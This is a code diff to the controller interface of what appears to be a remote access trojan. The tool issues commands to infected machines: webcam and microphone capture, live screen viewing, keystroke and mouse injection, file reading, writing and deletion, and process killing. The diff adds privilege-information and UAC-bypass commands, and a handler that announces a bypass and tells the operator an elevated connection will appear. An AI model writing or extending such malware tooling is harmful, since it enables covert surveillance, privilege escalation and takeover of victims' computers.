@@ -59,7 +59,14 @@ def execute_command(cmd, cmd_name):
         start_time = time.time()
         last_update = time.time()
 
-        is_special_cmd = cmd.upper().startswith(("SCREENSHOT", "DOWNLOAD:", "UPLOAD:", "SYSINFO", "POPUP:", "WEBCAM", "MICROPHONE", "PROCESS_LIST", "SYSTEM_METRICS", "KILL_PROCESS:", "FILE_BROWSER:", "DELETE_FILE:", "READ_TEXT_FILE:", "WRITE_TEXT_FILE:"))
+        is_special_cmd = cmd.upper().startswith((
+            "SCREENSHOT", "DOWNLOAD:", "UPLOAD:", "SYSINFO", "POPUP:",
+            "WEBCAM", "MICROPHONE", "PROCESS_LIST", "SYSTEM_METRICS",
+            "KILL_PROCESS:", "FILE_BROWSER:", "DELETE_FILE:",
+            "READ_TEXT_FILE:", "WRITE_TEXT_FILE:",
+            "PRIV_INFO", "UAC_BYPASS",
+            "LIVE_SCREEN", "MOUSE_", "KEY_PRESS:",
+        ))
         if cmd.upper().startswith("MICROPHONE"):
             try:
                 mic_duration = int(cmd.split(":")[1])
@@ -235,13 +242,20 @@ def _handle_special_response(output):
         elif resp_type == "FILE_BROWSER":
             if response.get("status") == "success":
                 if g.file_manager_window and g.file_manager_window.winfo_exists():
-                    import os
-                    def std_path(p):
-                        return os.path.normcase(os.path.abspath(p or ""))
-                    # Only update if it is the response to our last requested path (race condition guard)
+                    def _norm(p):
+                        """Normalize a remote path for comparison — no filesystem access."""
+                        if not p:
+                            return ""
+                        # Handle virtual drives listing
+                        if p in ("DRIVES", "System Drives"):
+                            return "system drives"
+                        # Lowercase + strip trailing separators for cross-platform compare
+                        return p.lower().rstrip("/\\")
                     last_req = getattr(g.file_manager_window, 'last_requested_path', '')
-                    if not last_req or std_path(response.get("path")) == std_path(last_req):
-                        g.root.after(0, lambda: feat.show_file_manager(response.get("path"), response.get("data")))
+                    resp_path = response.get("path", "")
+                    # Show if no last request tracked, or paths match after normalization
+                    if not last_req or _norm(resp_path) == _norm(last_req):
+                        g.root.after(0, lambda rp=resp_path, rd=response.get("data"): feat.show_file_manager(rp, rd))
             else:
                 g.root.after(0, lambda m=response.get('message'): messagebox.showerror("File Manager Error", f"Failed to list directory:\n{m}"))
                 if g.file_manager_window and g.file_manager_window.winfo_exists():
@@ -282,6 +296,21 @@ def _handle_special_response(output):
                 g.root.after(0, lambda m=response.get('message'): messagebox.showerror("Save Error", f"Failed to save file:\n{m}"))
                 if g.file_editor_window and g.file_editor_window.winfo_exists():
                     g.root.after(0, lambda: g.file_editor_window.on_save_failed())
+
+        elif resp_type == "PRIV_INFO":
+            g.root.after(0, lambda r=response: feat.show_privilege_window(r))
+
+        elif resp_type == "UAC_BYPASS":
+            status = response.get("status")
+            msg    = response.get("message", "")
+            if status == "success":
+                g.root.after(0, lambda m=msg: messagebox.showinfo(
+                    "🔥 UAC Bypass Triggered",
+                    f"{m}\n\nWatch the client list — an elevated (HIGH) connection will appear shortly."))
+            elif status == "already_elevated":
+                g.root.after(0, lambda m=msg: messagebox.showinfo("✅ Already Elevated", m))
+            else:
+                g.root.after(0, lambda m=msg: messagebox.showerror("UAC Bypass Failed", m))
 
     except json.JSONDecodeError:
         if output.strip():
